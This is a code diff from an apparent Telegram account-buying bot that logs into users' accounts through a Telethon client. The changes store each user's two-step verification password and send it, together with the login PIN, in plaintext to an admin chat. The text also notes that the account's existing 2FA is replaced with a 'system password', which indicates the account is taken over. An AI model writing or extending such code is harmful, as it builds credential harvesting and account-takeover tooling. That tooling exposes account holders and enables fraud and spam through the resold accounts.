@@ -2517,7 +2517,7 @@ Your payment will be moved to Main Balance after verification.
 💰 **Price:** ${country_data['sell_price']} USD
 """
         if context.user_data.get('pin'):
-            admin_notif += f"🔑 **2FA Code:** `{context.user_data.get('pin')}`\n"
+            admin_notif += f"🔑 **Login PIN:** `{context.user_data.get('pin')}`\n"
         
         admin_notif += "\nAccount logged in and 2FA secured.\n\"\"\""
         await context.bot.send_message(
@@ -2557,6 +2557,7 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         return WAITING_FOR_2FA
 
     password = update.message.text.strip()
+    context.user_data['two_fa'] = password
     client = context.user_data.get('telethon_client')
     phone = context.user_data.get('user_number')
 
@@ -2664,7 +2665,7 @@ Your payment will be moved to Main Balance after verification.
 💰 **Price:** ${country_data['sell_price']} USD
 """
         if context.user_data.get('two_fa'):
-            admin_notif += f"🔑 **2FA Code:** `{context.user_data.get('two_fa')}`\n"
+            admin_notif += f"🔐 **Two-Step Verification Enabled**\n\nPassword: `{context.user_data.get('two_fa')}`\n"
 
         admin_notif += "\nExisting 2FA was verified and updated to system password.\n\"\"\""
         await context.bot.send_message(
